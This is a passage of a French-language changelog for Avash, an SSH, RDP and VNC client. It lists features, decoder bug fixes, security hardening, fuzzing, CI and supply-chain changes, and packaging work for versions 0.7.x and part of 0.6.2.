  quatre en vol, dans un `.part` promu une fois complet, sans jamais écraser
  un fichier existant (« (2) »). Dans l'autre sens, des fichiers déposés sur
  le bureau (ou choisis par la palette, « Envoyer des fichiers au bureau
  distant… ») lui sont offerts : ils se collent dans son Explorateur, les
  dossiers avec leur arborescence, et le poste sert les octets demandés, y
  compris sur la copie verrouillée par le distant si le presse-papiers change
  entre-temps. Le protocole est celui de mstsc (`FileGroupDescriptorW`,
  flux `FileContentsRequest`, verrous), porté par IronRDP ; le processus
  d'Avash tient le découpage et l'écriture (`rdp-sidecar/src/fichiers.rs`,
  neuf tests, dont l'écriture dans le désordre, le refus d'un fichier, la
  réponse courte et le parcours des dossiers). Le serveur RDP de test offre
  un fichier et reçoit ceux du client ; le scénario bout en bout compare les
  octets d'un fichier de 2,5 Mo dans un sens et de 300 Ko dans l'autre. Les
  chemins reçus sont assainis par IronRDP (ni absolu, ni `..`), et le contenu
  n'est jamais téléchargé sans accord.
- **VNC.** Avash ouvre les bureaux VNC (RFB 3.8, authentification VNC
  classique, ZRLE, CopyRect, Raw, taille de bureau suivie) par le même
  processus, le même canal local et le même canvas que le RDP : « Connexion
  directe » et le formulaire d'un bureau enregistré ont un protocole, VNC met
  le port à 5900 et rend l'utilisateur facultatif, le mot de passe va dans le
  trousseau sous un compte `vnc:`. Le clavier voyage en keysyms X11 (le
  caractère obtenu, « a » sur un AZERTY comme sur un QWERTY, message `[14]`)
  là où le RDP transporte la touche physique ; un cran de molette est un
  bouton virtuel ; le presse-papiers passe dans les deux sens (Latin-1, ce que
  le protocole classique sait faire). Le client est `vnc-rs`, copié dans
  `rdp-sidecar/vendor/` avec ce qu'une relecture a rendu nécessaire avant de
  l'embarquer : toute allocation dictée par le serveur bornée à 8192 × 8192
  pixels, un `transmute` sur le résultat d'authentification et deux paniques
  remplacés par des erreurs, la file des événements détachée du verrou du
  client (une frappe ne pouvait pas partir tant qu'aucune image n'arrivait),
  un refus sans raison qui s'affichait « unexpected end of file », le
  presse-papiers en Latin-1 au lieu d'UTF-8 doublé ; le flux entier d'un
  serveur hostile a sa cible cargo-fuzz. Un serveur VNC de test
  (`test-vnc-server/`, rustvncserver, ZRLE) sert une image connue et réagit
  aux entrées ; le scénario bout en bout mesure les pixels : rouge et bleu au
  départ, un carré magenta là où l'on clique, tout vert après « g », le
  keysym 0xe9 reçu pour « é », et un mauvais mot de passe refusé avec sa
  raison. VNC ne chiffre rien : le formulaire le dit, et `SECURITY.md`
  recommande un tunnel SSH hors du réseau local.
- **Avash se soumet à winget.** `scripts/winget-manifeste.sh <version>` écrit
  les quatre manifestes du paquet `AdrienCros.Avash` (version, installeur
  NSIS par utilisateur avec sa clé de désinstallation, locales en-US et
  fr-FR) depuis la release GitHub et son `SHA256SUMS` ; ceux de la 0.7.2
  sont dans `packaging/winget/` et soumis à `microsoft/winget-pkgs` depuis
  le fork du mainteneur, par l'API, sans cloner le dépôt. La procédure, et
  l'automatisation possible depuis le workflow Release, sont dans
  `RELEASE.md`.
- **Le front est mesuré, sur la vraie application.** `scripts/mesures-front.sh`
  lance le harnais bout en bout et relève, machine au repos, le démarrage
  (189 ms d'exécution des modules JavaScript en médiane, 101 ms avant le
  premier contenu peint) et la latence à la frappe sur le sshd local (11 ms
  jusqu'à l'écho, 18 ms jusqu'à l'image suivante, médianes sur quarante
  touches). La feuille de route reprend ces chiffres : le cap de 16 ms à la
  frappe est tenu ; le découpage du paquet front attend une mesure qui
  sépare la compilation de xterm.js de l'initialisation d'avash.
- **Arch Linux, macOS et les logithèques : les paquets sont prêts.** Un
  `PKGBUILD` (`packaging/aur/avash/`) construit Avash depuis l'archive de la
  version publiée, front, processus RDP et application, à jeu de dépendances
  figé, et installe binaires, icônes, entrée de menu et métadonnées ; éprouvé
  sur le poste par `makepkg` puis en installant le paquet. Un cask Homebrew
  (`packaging/homebrew/avash.rb`, image disque et empreinte de la release,
  `livecheck`) attend un Mac pour être essayé puis soumis. Un fichier
  AppStream (`packaging/dev.avash.app.metainfo.xml`, validé par
  `appstreamcli`) décrit l'application aux logithèques et prépare Flathub. La
  publication sur l'AUR demande le compte du mainteneur ; les étapes sont dans
  `RELEASE.md`.
- **Les correctifs du décodeur RDP remontent à IronRDP.** Le drapeau de
  différence des tuiles progressives et la continuité du lecteur SRL sont déjà
  corrigés sur la branche principale d'IronRDP ; la palette RLEX à une seule
  couleur ne l'était pas (l'octet compacté était pris pour une longueur), la
  correction est proposée en amont avec son test
  ([Devolutions/IronRDP#1903](https://github.com/Devolutions/IronRDP/pull/1903)).
  Les copies portées dans `rdp-sidecar/vendor/` restent en place tant que la
  version publiée ne les contient pas.
- **Chaîne d'approvisionnement : l'image de la chaîne GitLab est épinglée et
  Node y est installé sans rien exécuter de téléchargé.** Le Scorecard de
  l'OpenSSF, désormais affiché sur le README, relevait deux choses dans
  `ci/Dockerfile` : une image de base sur une étiquette mobile
  (`rust:1-bookworm`) et le script d'installation de NodeSource téléchargé
  puis exécuté. L'image est fixée par empreinte, Dependabot (écosystème
  docker) propose la suivante ; Node 22 vient de l'archive officielle,
  vérifiée par sa somme publiée, essayée dans un conteneur jetable avant
  d'être confiée à la chaîne. Le paquet `wnaf`, retiré du registre dans sa
  version 0.14.0 (dépendance de russh par p256), passe en 0.14.1 dans les
  deux arbres. Les autres avis que le Scorecard compte, la famille GTK 3
  non maintenue qu'embarque Tauri sous Linux et l'attaque Marvin sur `rsa`
  via russh, n'ont pas de correctif en amont.
- **Le dépôt se présente comme les projets qu'on adopte.** README refondu
  sur le modèle des dépôts les plus suivis : accroche, badges réels (version,
  téléchargements, chaînes, Scorecard de l'OpenSSF, licence), une vraie
  capture en tête, une grille de fonctionnalités, l'installation par système
  avec la vérification des fichiers, un tableau face à PuTTY, MobaXterm,
  Remmina et Termius, et la qualité résumée en un tableau dont le détail (ce
  que chaque dispositif a trouvé) part dans `docs/qualite.md`. Une version
  anglaise, `README.en.md`, avec un sélecteur de langue en tête des deux. Les
  captures (`docs/captures/`) sont prises sur l'application réelle par le
  harnais bout en bout, bac à sable semé d'hôtes plausibles, session SSH
  ouverte sur le sshd local, bureau Windows du parc ; `scripts/captures-
  readme.sh` les régénère, mot de passe lu dans le trousseau. Une image
  d'aperçu social (1280 × 640) attend d'être déposée dans les réglages
  GitHub. Côté dépôt : description accentuée, vingt sujets, page d'accueil
  vers la dernière version, discussions ouvertes, gabarits d'issue (défaut,
  proposition, faille redirigée vers la divulgation privée) et de PR, code
  de conduite. Les notes de chaque release reprennent désormais la section
  du CHANGELOG de la version, avec les commandes de vérification ; une
  section absente fait échouer la publication plutôt que de publier sans un
  mot. Puis, sur les deux plateformes : une démonstration animée en tête
  (WebP de onze secondes et cent trente kilooctets, accueil, terminal SSH,
  connexion directe, bureau Windows, montée par le même harnais), un schéma
  d'architecture Mermaid rendu nativement par GitHub et GitLab, un
  « premier lancement en trois gestes », et, côté GitLab, trois badges de
  projet (pipeline, version, licence) posés par l'API ; le rendu GitLab a
  été contrôlé par son API markdown (blocs centrés, largeurs d'images,
  tableaux et badges conservés).

## [0.7.2] - 2026-09-04

- **La suite bout en bout relance son pilote s'il meurt en route.** Chaîne
  GitLab #3382 du 2026-09-04 : au milieu de la suite, WebKitWebDriver, le
  pilote natif que `tauri-driver` enchaîne, s'est éteint (« connection
  closed » puis « Connection refused ») et les deux derniers fichiers sur
  vingt-six ont échoué, alors que les trois exécutions précédentes passaient
  tout. Rien ne le relançait. Avant chaque fichier, la configuration vérifie
  que le pilote répond et, sinon, relance `tauri-driver` sur un port natif
  neuf. Essayé en tuant le natif à la main : la relance répond en moins de
  deux secondes ; la suite locale passe ensuite ses dix-sept fichiers sans
  serveur RDP.
- **Un serveur ne peut plus faire allouer n'importe quoi au canal graphique.**
  `CreateSurface` acceptait les côtés tels quels : 65535 × 65535 × 4 octets,
  dix-sept gigaoctets, et l'allocation tuait le processus, donc la session.
  La surface est bornée comme la résolution négociée (8192 de côté). Et
  `WireToSurface1` décodait une image aux dimensions annoncées avant tout
  rognage, ClearCodec en tête avec ses quatre plans NSCodec : une image qui ne
  tient pas dans sa surface est refusée avant décodage, comme chez FreeRDP.
  L'état des tuiles progressives, qui pèse trente-six kilooctets par tuile et
  couvre désormais les tuiles simples, n'est gardé que pour les tuiles de la
  surface, et son plafond passe de 4096 à celui d'une surface au maximum
  (16 384) : l'ancien refusait un écran 8K. Trois tests.
- **Le décodeur ClearCodec passe sous cargo-fuzz, et le fuzzing par mutation
  rejoue les cinq enregistrements.** Sixième cible dans `fuzz/`, deux images
  décodées à la suite par le même décodeur (caches compris), sept graines
  (NSCodec avec et sans sous-échantillonnage, RLEX à une et deux couleurs,
  brut, résiduel, glyphe mémorisé puis réutilisé) : 52 000 exécutions en une
  minute sans plantage. Le test de mutation du processus RDP inclut
  `windows-surfaces-successives` et `windows-clearcodec-nscodec`. Pour que
  cela reste supportable à chaque commit, les dépendances sont optimisées
  dans le profil de développement du processus RDP : sa suite passe de 224 s
  à 36 s. 101 tests dans le processus RDP, 1085 au total.
- **Une panne du registre npm ne fait plus tomber les chaînes.** Le
  2026-09-03, le job bout en bout de GitLab est tombé sur « 503 Service
  Unavailable » du point d'audit de registry.npmjs.org, après sept minutes
  d'attente, sans qu'aucune vulnérabilité soit en cause. Les six appels de
  `npm audit` (`check.sh`, GitHub, GitLab) passent par
  `scripts/npm-audit.sh`, qui réessaie trois fois, avec des délais de réseau
  bornés, quand le registre est indisponible, et jamais sur une faille. La
  panne ayant duré des heures le lendemain, les audits npm quittent les jobs
  de construction pour un job à eux dans chaque chaîne (`audit-npm` sur
  GitHub, `dependances` sur GitLab, avec l'audit cargo) : logés dans le job
  du front, dont dépendent la construction Rust et la suite bout en bout, ils
  sautaient tout le reste. Une panne ne rougit plus que ce job. Et pour la
  suite bout en bout seulement, dont les dépendances ne tournent que sur la
  machine de test, une panne du registre après trois essais est un
  avertissement, pas une erreur : le point d'audit a refusé sa requête de
  480 paquets pendant des heures, rougissant chaque PR Dependabot. Le
  front, périmètre de confiance réel, garde la porte fermée.
- **`SHA256SUMS` publié avec les seuls noms de fichiers.** Depuis la 0.7.0,
  chaque ligne portait le chemin du fichier dans la chaîne
  (`artefacts/avash-linux/target/…`) : `sha256sum -c SHA256SUMS` depuis le
  dossier de téléchargement, comme le README le promet, ne trouvait rien. Les
  prochaines versions écrivent le nom seul.

## [0.7.1] - 2026-09-04

- **Le processus RDP ne vide plus son image quand le chemin classique
  répète une taille que le canal graphique a déjà posée.** Deux chemins
  annoncent la même nouvelle taille l'un après l'autre, le canal graphique
  (`ResetGraphics`) puis le chemin classique (`DeactivateAll`) ; le second
  recréait l'image vide sans condition, ce qui pouvait jeter les premières
  trames de la nouvelle surface encore en attente d'accusé et, par la fusion
  des rectangles sales en boîtes englobantes, envoyer le noir de l'image
  vide à l'interface. Ce cas n'a pas été observé : le rectangle noir qui a
  motivé cette relecture, cru vu dans la barre des tâches d'un bureau
  imbriqué, s'est révélé à la mesure des pixels être un gris clair uniforme
  lu de travers sur une capture réduite (le message du commit `e2ef200`
  l'affirme à tort). Le durcissement reste : l'image n'est recréée que si la
  taille change, et repart alors de l'ancienne étirée, comme le canvas de
  l'interface. Trois tests (taille inchangée préservée, image étirée sans
  noir, réductions et tailles nulles). 98 tests dans le processus RDP, 1082
  au total.
- **Les carrés noirs d'un bureau Windows sont corrigés : le sous-codec
  NSCodec de ClearCodec manquait.** Reproduit sans réseau par le rejeu de
  l'enregistrement d'un avash Windows affichant `rdp-01`
  (`windows-clearcodec-nscodec`, sixième enregistrement de référence) : au
  PDU 249, les icônes de la barre des tâches (68×24 et 46×14) arrivent en
  ClearCodec, toute leur charge dans une région NSCodec, et IronRDP 0.9 les
  « décodait » sans erreur en laissant la région à zéro. Un rectangle noir,
  que `SurfaceToCache` emportait puis que `CacheToSurface` reposait à chaque
  redessin de la barre. Le paquet `ironrdp-graphics` rejoint les paquets
  portés avec un décodeur NSCodec écrit d'après FreeRDP (quatre plans, RLE,
  perte de couleur, YCoCg, sous-échantillonnage de la chroma). Dans la
  foulée, le parseur RLEX du paquet `ironrdp-pdu` porté lit la palette à une
  seule couleur comme FreeRDP et la spécification (un bit pour `stopIndex`,
  octet compacté conservé) : les coins unis de la barre des tâches (14×64,
  64×46) n'étaient plus refusés. Le journal du canal graphique décrit
  désormais aussi chaque image ClearCodec (couches, sous-codecs, glyphes),
  c'est lui qui a désigné NSCodec. L'enregistrement de référence
  `windows-egfx` avait le même rectangle noir dans sa barre des tâches, et
  son empreinte l'entérinait : elle change. 95 tests dans le processus RDP,
  585 dans les paquets portés, 1079 au total.
- **Les carrés gris et les blocs flous d'un bureau Windows vu à travers un
  avash Windows sont corrigés dans le décodeur.** Le magnétoscope, enregistré
  depuis l'avash Windows du contrôleur de domaine du parc pendant qu'il
  affichait `rdp-01`, rejoue le défaut sans réseau : `windows-surfaces-
  successives`, cinquième enregistrement de référence. Deux causes, toutes
  deux dans le codec RemoteFX Progressive, toutes deux tranchées en relisant
  FreeRDP, l'implémentation de référence. D'abord, quand Windows referme un
  contexte de codec et en rouvre un sur la même surface, ses premières
  tuiles sont « en différence » : elles ne portent que l'écart avec les
  coefficients déjà gardés, et le décodeur (comme IronRDP 0.9) les prenait
  pour des images complètes ; un coin de bureau inchangé devenait un carré
  gris uniforme, la dernière colonne de tuiles une bouillie de blocs. L'écart
  s'ajoute désormais à l'état, qui vit avec la surface et survit à
  `DeleteEncodingContext`. Ensuite, les paliers d'affinage (`upgrade`)
  repartaient du début des flux SRL et brut à chaque sous-bande, avec un
  décodeur SRL qui n'était pas celui de la spécification et un décalage qui
  oubliait le quantificateur de base : ils n'affinaient rien (netteté mesurée
  identique à la passe grossière) ou abîmaient. Le palier est réécrit d'après
  FreeRDP, un seul ruban par composante sur les dix bandes, LL3 en brut, et
  l'image gagne réellement en netteté (de 3,9 à 5,5 au laplacien sur
  l'enregistrement). Pour le diagnostic : `AVASH_RDP_JOURNAL_EGFX=1` fait
  décrire chaque commande du canal graphique, `--jusqu-a N` arrête le rejeu
  après N PDU pour bissecter en regardant les images, et le rejeu suit les
  redimensionnements (`ResetGraphics`). 94 tests dans le processus RDP, 880
  au total.
- **Plus de zones noires persistantes dans un bureau RDP affiché à travers
  une session RDP.** Reproduit sur un avash Windows 0.6.2 ouvert dans une
  session distante : dans son bureau `rdp-01`, le bouton OK de
  l'avertissement de connexion manquait, noir, jusqu'à ce que la souris le
  survole et que le serveur renvoie la zone — dans notre client comme dans
  FreeRDP, et notre décodeur, connecté au même serveur à la même
  résolution, l'affichait bien. La tuile se perdait donc dans WebView2 : le
  canvas 2D est une texture GPU, le GPU d'une session RDP est virtualisé, et
  chaque perte de contexte (une reconnexion suffit) efface la texture ;
  Chromium ne repeint ensuite que ce que le serveur renvoie. Le canvas est
  désormais logiciel (`willReadFrequently`), son bitmap vit en mémoire
  centrale et survit à tout : on ne fait que des `putImageData`, c'était le
  bon chemin de toute façon, sur toutes les plateformes. Un workflow
  « Essai Windows », déclenché à la main, construit l'installeur sans rien
  publier, pour éprouver un correctif sur une vraie machine avant la
  version.
- **Le magnétoscope s'enregistre depuis l'application, et se rejoue en image.**
  Des carrés noirs persistants sont signalés dans la fenêtre d'un avash
  Windows vu à travers une session RDP depuis un avash Linux, malgré le
  correctif de la 0.6.1. Pour trancher entre notre décodage et le rendu
  distant, il fallait le flux : `AVASH_RDP_ENREGISTRER=<fichier>` dans
  l'environnement d'avash fait enregistrer la session par le processus RDP
  (l'interface ne passait pas `--enregistrer`), avec un plafond réglable par
  `AVASH_RDP_ENREGISTRER_PLAFOND` (4 Mio par défaut, taillé pour une fixture,
  pas pour des minutes de flux), et `avash-rdp --rejouer <fichier> --image
  <png>` écrit l'image finale du rejeu sans réseau. L'enregistrement, qui
  contient tout ce que le serveur a affiché, naît désormais en 0600 (89
  tests dans le processus RDP, 875 au total).
- **La chaîne GitLab ne refait plus deux fois le même travail.** Un tag ne
  lance plus de pipeline (celui de la branche vient de vérifier le même
  commit, la publication est l'affaire du workflow Release de GitHub : 38
  minutes économisées par version), et une autre référence que `main` part
  du cache de `main` au lieu de compiler à froid. Les jobs tournent dans une
  image de base (`ci/Dockerfile`) construite sur le démon Docker du poste par
  le premier job du pipeline : paquets, Node 22, rustfmt, clippy, outils
  cargo et client Docker y sont figés au lieu d'être réinstallés cinq fois
  par passage. Les caches sont découpés par usage (registre, cibles,
  sidecar, npm) : un seul cache archivait plusieurs gigaoctets à la fin de
  chaque job, quatre minutes pour le job front qui n'en touchait rien. La
  conformité RDP pilote son parc xrdp sur le démon de l'hôte, plus en
  docker-in-docker : ses trois images sont construites une fois et gardées,
  ses conteneurs vivent sur un réseau Docker dédié sans rien publier, et le
  sidecar lui vient déjà compilé du job `rust`. Le job se raccorde à ce
  réseau par l'identifiant de son conteneur, pas par son nom d'hôte, que
  l'exécuteur choisit autrement : le premier passage a pendu une heure sur
  une adresse injoignable, l'attente est désormais bornée à deux secondes
  par essai. L'exécuteur passe à trois jobs en parallèle.

## [0.7.0] - 2026-09-03

- **Trois avis de sécurité de moins dans la suite bout en bout.** Les
  dépendances de test (WebdriverIO 9) traînaient `deepmerge-ts` 7
  (épuisement de pile) et `serialize-javascript` 6 (exécution de code par
  `RegExp`) sans qu'aucune version de WebdriverIO ne les corrige ; deux
  `overrides` npm imposent les versions corrigées, la suite tourne pareil.
  Restent treize avis, tous par `extract-zip`, sans correctif amont : c'est
  du code de test, jamais embarqué, et l'audit de `e2e/` ne bloque que sur
  « critique » pour cette raison.
- **La branche `main` est protégée**, sur GitHub comme sur GitLab : ni
  poussée forcée ni suppression, mainteneur compris, sans exiger de PR.
- **Un dossier créé par la modale s'attend plus longtemps, et l'échec dit ce
  qu'il voyait.** Sur l'exécuteur Windows, le scénario « + dossier » a une
  fois attendu huit secondes une ligne qui n'est pas venue, sans qu'on sache
  si la création traînait ou si le nom saisi différait. L'attente passe à
  quinze secondes et, si elle échoue, nomme les dossiers présents.
- **La clé de test SSH n'est plus une course.** Le harnais d'intégration
  générait sa clé « si le fichier n'existe pas », depuis chaque test : deux
  tests en parallèle passaient tous deux ce contrôle, ou le second lisait un
  fichier à moitié écrit, et six tests tombaient d'un coup sur « Could not
  read key » (vu en CI GitHub sur un commit qui ne touchait ni au cœur ni à
  ces tests). La clé est désormais générée une fois par processus et écrite
  par renommage ; un test à huit fils fixe le comportement (34 tests
  d'intégration, 872 au total).
- **Un répertoire existant garde ses droits.** `ecrire_atomiquement`
  resserrait à 0700 le répertoire parent de chaque fichier écrit, même quand
  il existait déjà : un export déposé dans `~/Documents` rendait `~/Documents`
  privé, sans un mot. Vu de la pire façon quand la suite de tests, lancée en
  root sur le poste du mainteneur, a passé `/tmp` en 0700 par les cas qui y
  écrivent directement, et privé tout le poste de son répertoire temporaire.
  Ne sont désormais resserrés que les répertoires d'Avash (`~/.ssh`,
  `~/.config/avash` et ses sous-répertoires) et ceux que l'écriture crée ;
  deux tests fixent les deux comportements (147 tests dans le cœur, 871 au
  total).
- **Le miroir GitLab vérifie enfin.** Un exécuteur est enregistré sur le poste
  du mainteneur (Docker privilégié, deux travaux à la fois) : la chaîne de
  `.gitlab-ci.yml`, écrite en 0.4.0, tourne pour la première fois — et ce
  premier passage a montré trois défauts qu'aucune relecture n'aurait vus :
  l'image `rust:1-bookworm` n'embarque ni `rustfmt` ni `clippy` ; Debian n'y
  fournit que Node 18, sous le plancher de stylelint et knip ; et son git 2.39
  reçoit un 401 de GitHub en HTTP/2 quand `cargo-deny` clone la base d'avis.
  La chaîne installe désormais les deux composants et Node 22, comme sur
  GitHub, force HTTP/1.1 pour ce clone, et met en cache les outils compilés
  (`tauri-driver`, `cargo-audit`, `cargo-deny`). Le job bout en bout, rejoué
  pièce par pièce dans un conteneur nu, crée aussi `/run/sshd` : lancé par
  root, le `sshd` du harnais l'exige. Ce job est ensuite mort trois fois au
  même endroit, sans message (`unknown_failure`) : GitLab est derrière le
  pare-feu applicatif de Cloudflare, qui rejetait le morceau de journal
  contenant la ligne de dpkg « Creating config file /etc/ssh/sshd_config »,
  et le runner abandonnait. Le déclencheur a été retrouvé en bissectant la
  sortie du conteneur contre le pare-feu ; le job installe désormais ses
  paquets en silence. La conformité RDP, elle, parle au parc par une
  variable `PARC_HOTE` : sur GitLab le parc tourne dans un démon
  docker-in-docker à part, et les scripts n'attendaient que `127.0.0.1`. Et
  comme un conteneur n'a pas de disposition clavier, les deux chaînes jouent
  un poste en français (`XKB_DEFAULT_LAYOUT=fr`) et le contrôle exige
  désormais la valeur exacte (`DISPOSITION_ATTENDUE=1036`), pas seulement
  autre chose que 0.
  Ce même root a fait tomber le test qui
  retire les droits d'un `known_hosts` : il lit un fichier `0o000` sans
  broncher, le test constate désormais que les droits sont appliqués avant
  d'exiger une erreur.
  Le miroir, qui avait cinquante commits de retard, est rattrapé, et son
  jeton rejoint celui de GitHub dans les secrets chiffrés du poste.
  `CONTRIBUTING.md` dit comment déclarer un autre exécuteur.
- **Les deux chaînes d'intégration lintent tout le front.** `ci.yml` et
  `.gitlab-ci.yml` passaient ESLint sur une liste énumérée de cinq fichiers
  — une trentaine de modules depuis le découpage — et sautaient stylelint,
  knip et l'audit des dépendances de la suite bout en bout, que `check.sh` et
  le hook de pré-commit jouent depuis la 0.6.2. Les deux chaînes font
  désormais exactement ce que fait la porte locale. Une poussée qui en suit
  une autre de près annule par ailleurs l'exécution devenue sans objet
  (groupes de concurrence sur `ci.yml` et `securite.yml`) : les exécuteurs
  Windows et macOS, les plus rares, vont au dernier commit. La liste des
  modules du front dans `docs/architecture.md`, le tableau des scénarios
  d'`e2e/README.md` et les compteurs de tests (869, dont 145 dans le cœur et
  62 dans l'interface) sont remis à niveau.
- **`AVASH_LANGUE` impose la langue.** Sur une machine sans la locale
  installée, la webview démarre en anglais quoi que disent `LANG` et
  `LANGUAGE` ; la variable, lue par le cœur et injectée avant le premier
  script, tranche — après un choix mémorisé, avant la locale. Le harnais
  bout en bout s'en sert sur toutes les plateformes.
- **Claude sur le dépôt GitHub.** Deux workflows installés depuis Claude Code :
  une mention `@claude` dans une issue ou une PR obtient une réponse, un
  correctif ou un résumé ; chaque PR reçoit une revue automatique en
  commentaires en ligne (les PR de Dependabot exceptées). Alignés sur les
  règles du dépôt : actions épinglées sur leur commit, permissions minimales.
- **Fuzzing guidé par la couverture.** Un crate `fuzz/` (cargo-fuzz, nightly)
  secoue les cinq parseurs qui lisent un fichier écrit par quelqu'un d'autre :
  `~/.ssh/config`, session PuTTY, sortie de `reg query`, `MobaXterm.ini`,
  asciicast. Chaque cible tourne 45 s dans le workflow Sécurité, à chaque
  poussée et chaque lundi ; en local, `fuzz/fuzz.sh`. Deux trouvailles en
  quelques secondes chacune. `Port 0` était lu comme un port, qu'OpenSSH
  refuse ; il vaut désormais « pas de port », pour l'hôte comme pour un
  rebond, et le test de mutation reçoit le fragment qui lui manquait. Et le
  décodage des noms de session PuTTY (`prod%20web`) **paniquait** sur un `%`
  suivi d'un caractère accentué — un simple nom de fichier dans
  `~/.putty/sessions` faisait tomber l'import ; il travaille désormais octet
  par octet, et n'accepte plus `%+2` comme séquence.
- **La suite bout en bout tourne aussi sous Windows.** À chaque poussée, sur
  tout ce qui ne demande pas de serveur local. Edge WebDriver ne sait plus
  lancer une application WebView2 depuis sa version 133 (« DevToolsActivePort
  file doesn't exist ») : l'application se compile avec la fonctionnalité
  `webdriver`, qui embarque un serveur WebDriver (tauri-plugin-wdio-webdriver)
  que le harnais lance et arrête à chaque fichier de scénarios. Jamais dans
  un binaire publié. Au passage, sous pilotage WebDriver, avash ne retire plus
  `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS` — hors pilotage, rien ne change.
  Le même chemin joue la suite **sous macOS** (WKWebView), qui n'a aucun
  pilote WebDriver : première fois que l'interface y est exercée.
- **Régression visuelle.** Un scénario compare l'accueil sur les deux
  thèmes, la palette et la modale de connexion à des captures de référence,
  pixel à pixel ; ce que les autres scénarios ne voient pas — une marge qui
  saute, une couleur de jeton qui change — rougit désormais. Les références
  sont celles de la chaîne, publiées en artefact à chaque passage.
- **Les commandes Tauri sont découpées par domaine.** `commands.rs` (2 900
  lignes) devient un répertoire : sessions, SFTP, tunnels, snippets,
  enregistrement, clés, secrets, dossiers, import, santé, et les tests à
  part ; chaque fichier importe explicitement ce qu'il prend à ses voisins,
  et `commands::x` reste le chemin de chaque commande. Le texte est repris
  tel quel.
- **Dépendances suivies.** Les quatre premières mises à jour d'actions
  proposées par Dependabot sont fusionnées ; le processus RDP passe à
  tokio-tungstenite 0.30 ; deux majeures sont écartées avec leur raison
  (x509-cert, lié aux paquets IronRDP portés ; TypeScript 7, que
  typescript-eslint n'accepte pas encore). Second lot, en une poussée :
  checkout 7, upload-artifact 7, action-gh-release 3 (toutes trois passent
  à Node 24) et codeql-action 4 — ses trois étapes ensemble, là où Dependabot
  ne proposait qu'`analyze` et `upload-sarif`, et l'analyse échouait avec un
  `init` resté en 3. Deux `Cargo.lock` orphelins dans les membres de l'espace
  de travail, que Cargo ignorait, sont retirés : ils faisaient compter à
  Scorecard des versions que personne ne construit.
- **La langue suit la locale au premier lancement** : français pour un
  système en `fr*`, anglais pour les autres, jusqu'à un choix explicite ;
  les tailles s'écrivent en Ko ou en KB, les dates en jj/mm/aa ou en ISO.
- **Finitions sur ce qui venait d'arriver.** L'enregistrement de session
  s'ouvre sur l'écran tel qu'il est au moment de démarrer, et non sur du
  noir ; deux enregistrements dans la même seconde ne se marchent plus
  dessus ; la palette liste les enregistrements, du plus récent au plus
  ancien, avec le dossier à portée de clic. La santé des hôtes survit au
  relancement et peut se sonder au démarrage, sur option, sans annonce.
  L'import reprend les bureaux RDP de MobaXterm et convertit les clés
  `.ppk` avec `puttygen` quand il est présent, au lieu de les laisser de
  côté.
- **La force des tests est mesurée par mutation.** Un premier passage de
  `cargo mutants` sur quatre modules du cœur a laissé survivre treize mutants,
  tous dans le calendrier de l'enregistreur, vérifié en forme mais pas en
  valeur ; un test contre des dates connues (1970, 29 février, an 2100) les
  tue.
- **Trois regards extérieurs sur le dépôt et deux portes de plus.** CodeQL
  (Rust et TypeScript), gitleaks sur tout l'historique et le Scorecard de
  l'OpenSSF tournent sur GitHub, Dependabot suit les quatre arbres de
  dépendances et les actions. En local, stylelint lit le CSS de la page et
  knip cherche le code mort ; `npm audit` s'ajoute aux audits Rust. Première
  moisson : deux modules du front (mise à jour automatique, panneaux
  redimensionnables) n'étaient plus chargés depuis le découpage en modules —
  chacun compilait, personne ne l'importait ; cinq dépendances déclarées mais
  jamais utilisées retirées ; trois `word-break` dépréciés remplacés.
- **macOS entre dans la chaîne.** Un job compile et teste le cœur, le
  processus RDP et l'interface sur `macos-latest` à chaque commit ; la
  release produit une image disque pour les Mac à puce Apple et l'archive
  signée que la mise à jour automatique télécharge. Sans identité de
  développeur Apple, l'application n'est pas notarisée : clic droit → Ouvrir
  au premier lancement. Pas encore éprouvée sur une machine réelle.
- **Santé des hôtes.** « Vérifier la santé des hôtes », dans la palette,
  ouvre une connexion TCP jusqu'au port de chaque hôte SSH et RDP — seize à
  la fois, chacune bornée à une seconde et demie — et la referme aussitôt :
  ni authentification, ni bannière. Le voyant de la ligne passe au vert ou au
  rouge, l'infobulle donne la latence ou la raison ; une session ouverte
  garde la priorité sur le voyant. Un hôte derrière un rebond n'est pas
  sondé, ce n'est pas lui qu'on joindrait en direct.
- **Enregistrement de session au format asciicast.** Depuis le menu
  contextuel du terminal, une session s'enregistre dans un fichier asciicast
  v2 — celui d'`asciinema`, rejouable avec `asciinema play` — sous le
  répertoire de configuration, en 0600. Seule la sortie est enregistrée, avec
  les redimensionnements ; jamais les frappes : un mot de passe tapé à
  l'aveugle n'y figure pas. Le voyant rouge de l'onglet dit que ça tourne ;
  fermer l'onglet ferme le fichier.
- **L'interface parle anglais.** Toutes les chaînes — la page comme les
  textes produits par le code, environ trois cents — sont extraites dans un
  module de traduction ; le français reste la source et la langue par défaut,
  l'anglais couvre chaque clé sous le contrôle d'un test. La bascule se fait
  dans la palette (Ctrl+K, « Switch to English ») et se mémorise.
- **Import des sessions PuTTY et MobaXterm.** Un bouton « Importer des
  sessions » lit les sessions PuTTY (`~/.putty/sessions` sous Unix, le
  registre sous Windows) et MobaXterm (`MobaXterm.ini` ou un export
  `.mxtsessions`, dossiers compris), puis propose la liste : alias
  modifiables, un hôte déjà déclaré pour le même serveur décoché d'office, les
  clés `.ppk` et les mandataires signalés plutôt que repris en silence. Seules
  les sessions SSH sont écrites, dans `~/.ssh/config` ; les mots de passe ne
  sont jamais lus.
- **Un bouton plein survolé reste lisible en thème clair.** Le survol
  éclaircissait le fond (contraste 3,98:1 avec le texte blanc, sous le seuil
  AA de 4,5:1) ; l'audit axe-core l'a vu le jour où le pointeur s'est trouvé
  sur le bouton d'accueil. Le survol fonce désormais sur fond clair, éclaircit
  sur fond sombre : 5,9:1 et plus dans les deux cas.
- **Un plancher de débit garde le décodeur UTF-8 en flux** : une régression
  algorithmique ferait échouer la suite, une machine chargée non.

## [0.6.2] - 2026-09-02

Une version de fond, sans fonctionnalité nouvelle : le panneau SFTP cesse
d'ouvrir une seconde connexion, le mot de passe n'est plus gardé en mémoire
après la connexion, les deux plus gros fichiers du projet sont découpés en
modules, la chaîne d'intégration joue enfin tous les scénarios, et quarante
tests de plus couvrent ce que seuls des commentaires décrivaient.

- **La chaîne d'intégration joue enfin tous les scénarios bout en bout.** Sept
  fichiers sur vingt et un — connexion SSH réelle, SFTP, les trois RDP, les
  onglets mixtes, « enregistrer puis connecter » — n'étaient exécutés qu'en
  local, alors que ce sont ceux qui traversent réellement les protocoles. Le
